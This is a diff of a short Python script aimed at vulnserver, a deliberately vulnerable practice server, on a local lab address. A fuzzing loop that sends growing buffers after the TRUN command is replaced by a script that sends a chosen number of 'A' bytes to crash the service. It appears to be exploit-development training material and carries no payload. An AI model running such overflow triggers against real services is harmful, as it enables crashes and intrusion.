@@ -1,21 +1,23 @@
-#!/usr/bin/python3
+#!/usr/bin/python2
 import socket
-import time
 
-target = "192.168.1.138"
-port = 9999
+server = '192.168.1.138'  # Windows 7 vulnserver IP
+sport = 9999
 
-buffer = b"A" * 100
+length = int(raw_input('Length of attack: '))
 
-while True:
-    try:
-        print(f"Fuzzing with {len(buffer)} bytes")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.send(b"TRUN /.:/" + buffer)
-        s.close()
-        buffer += b"A" * 100
-        time.sleep(1)
-    except:
-        print("Crash detected!")
-        break
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((server, sport))
+
+print s.recv(1024)
+print "Sending attack length", length, "to TRUN ."
+
+attack = 'A' * length
+s.send('TRUN .' + attack + '\r\n')
+
+print s.recv(1024)
+s.send('EXIT\r\n')
+print s.recv(1024)
+
+s.close()
+
